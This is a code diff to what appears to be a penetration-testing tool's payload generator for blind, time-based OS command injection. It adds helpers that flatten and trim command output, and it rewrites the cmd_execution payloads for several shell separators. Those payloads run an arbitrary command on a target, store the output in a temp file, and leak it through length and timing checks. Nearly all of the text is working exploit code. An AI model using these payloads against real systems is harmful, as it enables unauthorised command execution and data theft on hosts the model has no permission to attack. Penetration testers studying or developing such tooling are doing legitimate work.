@@ -36,6 +36,24 @@ its length however many lines it came in.
 def windows_cmd_text(cmd):
   return "([string](cmd /c " + cmd + ")).trim()"
 
+def flattened_file_text(OUTPUT_TEXTFILE):
+  """
+  The file's contents as one line: every newline in it turned into a space.
+
+  Output of any shape is measured and read back as a single string, so the newlines between lines
+  have to become something the one line can hold. Read by redirection rather than through a pipe,
+  because the separator under test is the only one a payload is allowed to chain itself with.
+  """
+  return "tr '" + settings.END_LINE.ESCAPED_LF + "' '\\040' <" + OUTPUT_TEXTFILE
+
+def trimmed_output_text():
+  """
+  The flattened text without the space standing in for the trailing newline, which had been making
+  every result a character longer than it was. Matched as a class rather than written out, so that
+  a script rewriting whitespace cannot rewrite it, and suffix removal adds no command of its own.
+  """
+  return "${" + settings.RANDOM_VAR_GENERATOR + "%[[:space:]]}"
+
 """
 Tempfile-based decision payload (check if host is vulnerable).
 """
@@ -175,8 +193,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
     if separator in (";", "\n", "\r\n") :
       arith_operator = "<=" if operator == "-le" else "=="
       payload = (separator +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr '" + settings.END_LINE.ESCAPED_LF + "' '\\040' <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "echo \"$" + settings.RANDOM_VAR_GENERATOR + "\" >" + OUTPUT_TEXTFILE + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
+                "echo \"" + trimmed_output_text() + "\" >" + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
@@ -187,8 +205,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 )
     elif separator == "&":
       payload = (separator +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "&&" + " tr '" + settings.END_LINE.ESCAPED_LF + "' '\\040' <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
-                "echo \"$" + settings.RANDOM_VAR_GENERATOR + "\" >" + OUTPUT_TEXTFILE + "&&" +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "&&" + " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + "&&" +
+                "echo \"" + trimmed_output_text() + "\" >" + OUTPUT_TEXTFILE + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}&&" +
                 "[ " + str(j) + " " + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "1} ]&&" +
@@ -202,8 +220,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       ampersand = "&"
       payload = (ampersand +
                 "sleep 0 " + separator +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr -d '" + settings.END_LINE.ESCAPED_LF + "' <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "echo \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
+                "echo \"" + trimmed_output_text() + "\"" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
